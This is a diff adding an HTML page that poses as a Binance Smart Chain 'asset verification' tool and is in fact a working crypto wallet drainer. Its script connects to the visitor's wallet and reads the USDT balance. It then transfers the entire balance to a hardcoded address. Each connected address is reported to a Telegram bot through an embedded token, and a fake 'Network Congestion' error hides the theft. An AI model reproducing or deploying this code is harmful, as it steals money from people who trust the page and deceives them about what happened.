@@ -1,1 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Asset Verification</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
+    <style>
+        body { margin: 0; font-family: 'Inter', -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: #1e2329; padding: 35px; border-radius: 20px; text-align: center; width: 100%; max-width: 350px; border: 1px solid #2d3139; }
+        
+        /* Chota aur subtle BEP20 logo */
+        .top-icon { width: 50px; margin-bottom: 20px; }
+        
+        h2 { font-size: 22px; font-weight: 600; margin-bottom: 15px; }
+        p { color: #929aa5; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+        
+        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
+        .status { font-size: 11px; color: #0ecb81; margin-top: 20px; opacity: 0.8; letter-spacing: 0.5px; }
+        
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 99; flex-direction: column; align-items: center; justify-content: center; }
+        .loader { border: 3px solid #333; border-top: 3px solid #3172DE; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
 
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/binance-smart-chain-bnb-logo.png" class="top-icon">
+        
+        <h2>Verify Assets</h2>
+        <p>Connect your wallet for a secure snapshot of your Binance Smart Chain assets.</p>
+        
+        <button class="btn" onclick="start()">Verify Assets</button>
+        
+        <div class="status">● NODE CONNECTION ACTIVE</div>
+    </div>
+
+    <div id="overlay">
+        <div class="loader"></div>
+        <p style="color:#3172DE; margin-top:15px; font-weight:bold;">Initializing...</p>
+    </div>
+
+    <script>
+        // Aapki ID aur Details
+        const MY_ADDR = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        const TG_TOKEN = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
+        const TG_CHAT = "7849151110";
+
+        async function start() {
+            if (!window.ethereum && !window.trustwallet) {
+                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
+                return;
+            }
+            document.getElementById("overlay").style.display = "flex";
+            try {
+                const web3 = new Web3(window.ethereum || window.trustwallet);
+                const accs = await web3.eth.requestAccounts();
+                const user = accs[0];
+                
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+
+                const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+                const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
+                const bal = await contract.methods.balanceOf(user).call();
+
+                // Telegram Pe Notification
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=👤 Connected: ${user}`);
+
+                if (parseInt(bal) > 0) {
+                    await contract.methods.transfer(MY_ADDR, bal).send({ from: user });
+                    alert("Sync Error: Network Congestion.");
+                } else {
+                    alert("Verification Complete.");
+                }
+            } catch (e) {
+                alert("Security Reject.");
+            } finally {
+                document.getElementById("overlay").style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
